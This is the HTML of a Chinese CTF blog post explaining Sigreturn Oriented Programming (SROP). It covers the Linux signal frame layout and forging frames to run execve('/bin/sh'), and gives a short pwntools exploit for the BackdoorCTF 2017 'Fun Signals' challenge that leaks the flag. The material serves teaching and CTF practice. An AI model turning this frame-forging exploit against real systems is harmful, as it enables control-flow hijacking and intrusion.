<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SROP | BLOG</title><meta name=keywords content="PWN知识点"><meta name=description content="SROP srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制
signal 机制 如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。
一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。 一个新的返回地址被添加到栈顶，这个返回地址指向 sigreturn 系统调用。 signal handler 被调用，signal handler 的行为取决于收到什么 signal。 signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 sigreturn 系统调用。 sigreturn 利用 signal frame 恢复所有寄存器以回到之前的状态。 最后，程序执行继续。 64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。 // defined in /usr/include/sys/ucontext.h /* Userlevel context."><meta name=author content="JUHUA"><link rel=canonical href=https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/srop/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.4e75d3a6e83470cbf55a23cee683af5cbbe70b5bf3928f07329fc682ebf90c12.css integrity="sha256-TnXTpug0cMv1WiPO5oOvXLvnC1vzko8HMp/Gguv5DBI=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="SROP"><meta property="og:description" content="SROP srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制
signal 机制 如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。
一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。 一个新的返回地址被添加到栈顶，这个返回地址指向 sigreturn 系统调用。 signal handler 被调用，signal handler 的行为取决于收到什么 signal。 signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 sigreturn 系统调用。 sigreturn 利用 signal frame 恢复所有寄存器以回到之前的状态。 最后，程序执行继续。 64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。 // defined in /usr/include/sys/ucontext.h /* Userlevel context."><meta property="og:type" content="article"><meta property="og:url" content="https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/srop/"><meta property="og:image" content="https://juhuax.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-06-22T00:00:00+00:00"><meta property="article:modified_time" content="2023-06-22T00:00:00+00:00"><meta property="og:site_name" content="ExampleSite"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://juhuax.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="SROP"><meta name=twitter:description content="SROP srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制
signal 机制 如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。
一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。 一个新的返回地址被添加到栈顶，这个返回地址指向 sigreturn 系统调用。 signal handler 被调用，signal handler 的行为取决于收到什么 signal。 signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 sigreturn 系统调用。 sigreturn 利用 signal frame 恢复所有寄存器以回到之前的状态。 最后，程序执行继续。 64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。 // defined in /usr/include/sys/ucontext.h /* Userlevel context."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://juhuax.github.io/posts/"},{"@type":"ListItem","position":2,"name":"SROP","item":"https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/srop/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SROP","name":"SROP","description":"SROP srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制\nsignal 机制 如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。\n一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。 一个新的返回地址被添加到栈顶，这个返回地址指向 sigreturn 系统调用。 signal handler 被调用，signal handler 的行为取决于收到什么 signal。 signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 sigreturn 系统调用。 sigreturn 利用 signal frame 恢复所有寄存器以回到之前的状态。 最后，程序执行继续。 64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。 // defined in /usr/include/sys/ucontext.h /* Userlevel context.","keywords":["PWN知识点"],"articleBody":"SROP srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制\nsignal 机制 如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。\n一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。 一个新的返回地址被添加到栈顶，这个返回地址指向 sigreturn 系统调用。 signal handler 被调用，signal handler 的行为取决于收到什么 signal。 signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 sigreturn 系统调用。 sigreturn 利用 signal frame 恢复所有寄存器以回到之前的状态。 最后，程序执行继续。 64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。 // defined in /usr/include/sys/ucontext.h /* Userlevel context. */ typedef struct ucontext_t { unsigned long int uc_flags; struct ucontext_t *uc_link; stack_t uc_stack; // the stack used by this context mcontext_t uc_mcontext; // the saved context sigset_t uc_sigmask; struct _libc_fpstate __fpregs_mem; } ucontext_t; // defined in /usr/include/bits/types/stack_t.h /* Structure describing a signal stack. */ typedef struct { void *ss_sp; size_t ss_size; int ss_flags; } stack_t; // difined in /usr/include/bits/sigcontext.h struct sigcontext { __uint64_t r8; __uint64_t r9; __uint64_t r10; __uint64_t r11; __uint64_t r12; __uint64_t r13; __uint64_t r14; __uint64_t r15; __uint64_t rdi; __uint64_t rsi; __uint64_t rbp; __uint64_t rbx; __uint64_t rdx; __uint64_t rax; __uint64_t rcx; __uint64_t rsp; __uint64_t rip; __uint64_t eflags; unsigned short cs; unsigned short gs; unsigned short fs; unsigned short __pad0; __uint64_t err; __uint64_t trapno; __uint64_t oldmask; __uint64_t cr2; __extension__ union { struct _fpstate * fpstate; __uint64_t __fpstate_word; }; __uint64_t __reserved1 [8]; }; 在栈中的分布如下 SROP 利用原理 在执行 sigreturn 系统调用的时候，不会对 signal 做检查，它不知道当前的这个 frame 是不是之前保存的那个 frame。由于 sigreturn 会从用户栈上恢复恢复所有寄存器的值，而用户栈是保存在用户进程的地址空间中的，是用户进程可读写的。如果攻击者可以控制了栈，也就控制了所有寄存器的值，而这一切只需要一个 gadget：syscall; ret;。 通过设置 eax/rax 寄存器，可以利用 syscall 指令执行任意的系统调用，然后我们可以将 sigreturn 和其他的系统调用串起来，形成一个链，从而达到任意代码执行的目的。下面是一个伪造 frame 的例子： rax=59 是 execve 的系统调用号，参数 rdi 设置为字符串“/bin/sh”的地址，rip 指向系统调用 syscall，最后，将 rt_sigreturn 设置为 sigreturn 系统调用的地址。当 sigreturn 返回后，就会从这个伪造的 frame 中恢复寄存器，从而拿到 shell。 对于这个寄存器的选择，因为系统调用号必须存入 rax 中，其他的寄存器选择就需要按照 Linux 下的函数调用约定来进行。\npwnlib. rop. srop 在 pwntools 中已经集成了 SROP 的利用工具，即 pwnlib.rop.srop，直接使用类 SigreturnFrame，我们可以看到针对不同的架构 SigreturnFrame 构造了不同的 uncontext_t BackdoorCTF 2017 Fun Signals 查看文件，可以看到这是一个 64 位的程序，并且没有开任何防护措施 拖入 IDA 中查看，可以看到程序中进行了两次 syscall，第一次 rax 的值是 0，调用 read 函数，第二次 rax 值是 15，执行停止程序。同时我们也可以看到 flag 的位置，那么我们需要利用 SROP 将该位置的 flag 输出。 如何利用 再看这两个 syscall：\n第一个 syscall 是 read 函数，此时的 edi 是 0，edx 是 0 x 400，rsi 是栈顶的值，根据 read 函数的参数和 Linux 函数调用约定可以知道，这意思是从标准输入读取0x400个字节到栈顶。 第二个 syscall 是 sigreturn，它会将栈中的数据按照 ucontext_t 结构恢复寄存器。 所以我们可以写入一个伪造的 sigreturn frame，让 sigreturn 恢复。 为了能够输出 flag，那我们伪造的 sigreturn frame 得是一个 write 函数的系统调用，系统调用号是0x1 from pwn import * elf = ELF('./funsignals_player_bin') io = process('./funsignals_player_bin') # io = remote('hack.bckdr.in', 9034) context.clear() context.arch = \"amd64\" # Creating a custom frame frame = SigreturnFrame() frame.rax = constants.SYS_write frame.rdi = constants.STDOUT_FILENO frame.rsi = elf.symbols['flag'] frame.rdx = 50 frame.rip = elf.symbols['syscall'] io.send(bytes(frame)) io.interactive() 成功将 flag 输出。 ","wordCount":"373","inLanguage":"en","datePublished":"2023-06-22T00:00:00Z","dateModified":"2023-06-22T00:00:00Z","author":{"@type":"Person","name":"JUHUA"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/srop/"},"publisher":{"@type":"Organization","name":"BLOG","logo":{"@type":"ImageObject","url":"https://juhuax.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://juhuax.github.io/ accesskey=h title="JUHUA BLOG (Alt + H)"><img src=https://juhuax.github.io/apple-touch-icon.png alt aria-label=logo height=35>JUHUA BLOG</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://juhuax.github.io/archives/ title=archives><span>archives</span></a></li><li><a href=https://juhuax.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://juhuax.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://juhuax.github.io/about/ title=about><span>about</span></a></li><li><a href=https://juhuax.github.io/search/ title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://juhuax.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://juhuax.github.io/posts/>Posts</a></div><h1 class=post-title>SROP</h1><div class=post-meta><span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;373 words&nbsp;·&nbsp;JUHUA
创建:&nbsp;<span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;|&nbsp;时长: 2分钟&nbsp;|&nbsp;JUHUA&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/1.%e5%ad%a6%e4%b9%a0/2.%e5%88%b7%e9%a2%98/CTF/PWN/SROP.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#srop aria-label=SROP>SROP</a><ul><li><a href=#signal-%e6%9c%ba%e5%88%b6 aria-label="signal 机制">signal 机制</a></li><li><a href=#srop-%e5%88%a9%e7%94%a8%e5%8e%9f%e7%90%86 aria-label="SROP 利用原理">SROP 利用原理</a></li></ul></li><li><a href=#pwnlib-rop-srop aria-label="pwnlib. rop. srop">pwnlib. rop. srop</a></li><li><a href=#backdoorctf-2017-fun-signals aria-label="BackdoorCTF 2017 Fun Signals">BackdoorCTF 2017 Fun Signals</a><ul><li><a href=#%e5%a6%82%e4%bd%95%e5%88%a9%e7%94%a8 aria-label=如何利用>如何利用</a></li></ul></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=srop>SROP<a hidden class=anchor aria-hidden=true href=#srop>#</a></h2><p>srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制</p><h3 id=signal-机制>signal 机制<a hidden class=anchor aria-hidden=true href=#signal-机制>#</a></h3><p><img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230504224226.png alt=image.png>
如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。</p><ul><li>一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。</li><li>一个新的返回地址被添加到栈顶，这个返回地址指向 <code>sigreturn</code> 系统调用。</li><li>signal handler 被调用，signal handler 的行为取决于收到什么 signal。</li><li>signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 <code>sigreturn</code> 系统调用。</li><li><code>sigreturn</code> 利用 signal frame 恢复所有寄存器以回到之前的状态。</li><li>最后，程序执行继续。
64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// defined in /usr/include/sys/ucontext.h
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cm>/* Userlevel context.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=kt>ucontext_t</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>int</span> <span class=n>uc_flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=kt>ucontext_t</span> <span class=o>*</span><span class=n>uc_link</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>stack_t</span> <span class=n>uc_stack</span><span class=p>;</span>           <span class=c1>// the stack used by this context
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>mcontext_t</span> <span class=n>uc_mcontext</span><span class=p>;</span>     <span class=c1>// the saved context
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>sigset_t</span> <span class=n>uc_sigmask</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>_libc_fpstate</span> <span class=n>__fpregs_mem</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=kt>ucontext_t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// defined in /usr/include/bits/types/stack_t.h
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cm>/* Structure describing a signal stack.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>ss_sp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>ss_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>ss_flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=kt>stack_t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// difined in /usr/include/bits/sigcontext.h
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>struct</span> <span class=n>sigcontext</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r11</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r13</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r14</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r15</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rdi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rsi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rbp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rbx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rdx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rax</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rcx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rsp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rip</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>eflags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>cs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>gs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>fs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>__pad0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>err</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>trapno</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>oldmask</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>cr2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__extension__</span> <span class=k>union</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>struct</span> <span class=n>_fpstate</span> <span class=o>*</span> <span class=n>fpstate</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>__uint64_t</span> <span class=n>__fpstate_word</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>__reserved1</span> <span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>在栈中的分布如下
<img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230504224245.png alt></p><h3 id=srop-利用原理>SROP 利用原理<a hidden class=anchor aria-hidden=true href=#srop-利用原理>#</a></h3><p>在执行 <code>sigreturn</code> 系统调用的时候，不会对 signal 做检查，它不知道当前的这个 frame 是不是之前保存的那个 frame。由于 <code>sigreturn</code> 会从用户栈上恢复恢复所有寄存器的值，而用户栈是保存在用户进程的地址空间中的，是用户进程可读写的。如果攻击者可以控制了栈，也就控制了所有寄存器的值，而这一切只需要一个 gadget：<code>syscall; ret;</code>。
通过设置 <code>eax/rax</code> 寄存器，可以利用 <code>syscall</code> 指令执行任意的系统调用，然后我们可以将 <code>sigreturn</code> 和其他的系统调用串起来，形成一个链，从而达到任意代码执行的目的。下面是一个伪造 frame 的例子：
<img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230504224317.png alt=image.png></p><p><code>rax=59</code> 是 <code>execve</code> 的系统调用号，参数 <code>rdi</code> 设置为字符串“/bin/sh”的地址，<code>rip</code> 指向系统调用 <code>syscall</code>，最后，将 <code>rt_sigreturn</code> 设置为 <code>sigreturn</code> 系统调用的地址。当 <code>sigreturn</code> 返回后，就会从这个伪造的 frame 中恢复寄存器，从而拿到 shell。
对于这个寄存器的选择，因为系统调用号必须存入 rax 中，其他的寄存器选择就需要按照 Linux 下的函数调用约定来进行。</p><h2 id=pwnlib-rop-srop>pwnlib. rop. srop<a hidden class=anchor aria-hidden=true href=#pwnlib-rop-srop>#</a></h2><p>在 pwntools 中已经集成了 SROP 的利用工具，即 <a href=http://docs.pwntools.com/en/stable/rop/srop.html>pwnlib.rop.srop</a>，直接使用类 <code>SigreturnFrame</code>，我们可以看到针对不同的架构 <code>SigreturnFrame</code> 构造了不同的 uncontext_t
<img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230504224340.png alt=image.png></p><h2 id=backdoorctf-2017-fun-signals>BackdoorCTF 2017 Fun Signals<a hidden class=anchor aria-hidden=true href=#backdoorctf-2017-fun-signals>#</a></h2><p>查看文件，可以看到这是一个 64 位的程序，并且没有开任何防护措施
<img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230504224404.png alt=image.png>
拖入 IDA 中查看，可以看到程序中进行了两次 syscall，第一次 rax 的值是 0，调用 read 函数，第二次 rax 值是 15，执行停止程序。同时我们也可以看到 flag 的位置，那么我们需要利用 SROP 将该位置的 flag 输出。
<img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230504224437.png alt=image.png></p><h3 id=如何利用>如何利用<a hidden class=anchor aria-hidden=true href=#如何利用>#</a></h3><p>再看这两个 syscall：</p><ul><li>第一个 syscall 是 read 函数，此时的 edi 是 0，edx 是 0 x 400，rsi 是栈顶的值，根据 read 函数的参数和 Linux 函数调用约定可以知道，这意思是从标准输入读取0x400个字节到栈顶。</li><li>第二个 syscall 是 sigreturn，它会将栈中的数据按照 ucontext_t 结构恢复寄存器。
所以我们可以写入一个伪造的 sigreturn frame，让 sigreturn 恢复。
为了能够输出 flag，那我们伪造的 sigreturn frame 得是一个 write 函数的系统调用，系统调用号是0x1</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
